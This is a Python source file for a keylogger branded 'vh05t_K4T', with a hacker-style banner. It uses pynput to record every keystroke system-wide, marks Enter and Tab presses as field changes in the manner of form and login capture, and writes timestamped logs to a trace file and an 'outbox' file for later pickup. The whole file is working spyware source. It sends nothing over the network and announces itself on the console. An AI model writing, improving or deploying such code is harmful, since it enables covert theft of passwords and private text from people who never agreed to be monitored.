# ============================================================
#   V1rtu3-h05t : v_kat (Virtue Keystroke Access Terminal)
# ============================================================

from pynput.keyboard import Listener, Key
import time, threading

# === Banner splash ===
print(r"""
╔═══════════════════════════════════════╗
║                                       ║
║        vh05t_K4T v1.0                ║
║   Virtue Keystroke Access Terminal    ║
║                                       ║
╚═══════════════════════════════════════╝

   [+] vh05t_K4T engaged...
""")

# themed log files
v1rtu3_trace_file = 'v1rtu3_trace.txt'
v1rtu3_outbox_file = 'v_kat_outbox.txt'

# buffer state
v_kat_buffer = ""
v1rtu3_last_flush = time.time()

def v1rtu3_log(entry):
    timestamped = f"{time.strftime('%H:%M:%S')} - {entry}"
    with open(v1rtu3_trace_file, 'a') as f:
        f.write(timestamped + '\n')
    with open(v1rtu3_outbox_file, 'a') as f:
        f.write(timestamped + '\n')
    print(timestamped)

def v1rtu3_flush(force=False):
    global v_kat_buffer, v1rtu3_last_flush
    if v_kat_buffer.strip():
        v1rtu3_log(v_kat_buffer.strip())
        v_kat_buffer = ""
    v1rtu3_last_flush = time.time()

def v_kat_capture(key):
    global v_kat_buffer, v1rtu3_last_flush

    # printable characters
    if hasattr(key, 'char') and key.char is not None:
        v_kat_buffer += key.char
        return

    # special keys
    if key == Key.space:
        v1rtu3_flush()
    elif key == Key.enter:
        v1rtu3_flush()
        v1rtu3_log("[ENTER]")
    elif key == Key.tab:
        v1rtu3_flush()
        v1rtu3_log("[Field Change]")
    elif key == Key.backspace:
        if v_kat_buffer:
            v_kat_buffer = v_kat_buffer[:-1]
    elif key == Key.esc:
        # clean exit solution
        v1rtu3_flush(force=True)
        print("\n[+] vh05t_K4T terminated by ESC key.")
        return False  # stops the Listener
    else:
        pass  # ignore modifiers

def v1rtu3_auto_flush():
    """Flush leftover word if idle for >5 seconds."""
    global v1rtu3_last_flush
    while True:
        time.sleep(1)
        if v_kat_buffer and (time.time() - v1rtu3_last_flush > 5):
            v1rtu3_flush()

# start background auto-flusher
threading.Thread(target=v1rtu3_auto_flush, daemon=True).start()

try:
    with Listener(on_press=v_kat_capture) as v_kat_listener:
        v_kat_listener.join()
except KeyboardInterrupt:
    v1rtu3_flush(force=True)
    print("\n[+] vh05t_K4T terminated by operator.")